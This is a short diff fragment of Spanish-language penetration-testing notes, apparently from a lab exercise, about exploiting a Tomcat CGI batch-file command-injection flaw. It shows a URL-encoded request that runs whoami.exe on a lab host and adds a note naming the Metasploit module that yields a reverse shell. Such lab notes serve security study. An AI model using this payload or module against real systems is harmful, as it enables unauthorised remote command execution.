@@ -27,3 +27,7 @@ Encodeado:
             http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
             
 
+#### Con metasploit:
+Muy seguido nos encontramos que es difícil explotar estas apps puesto que el proceso es engorroso, metasploit tiene un módulo capaz de permitirnos una reverseshell
+
+use exploit/windows/http/tomcat_cgi_cmdlineargs
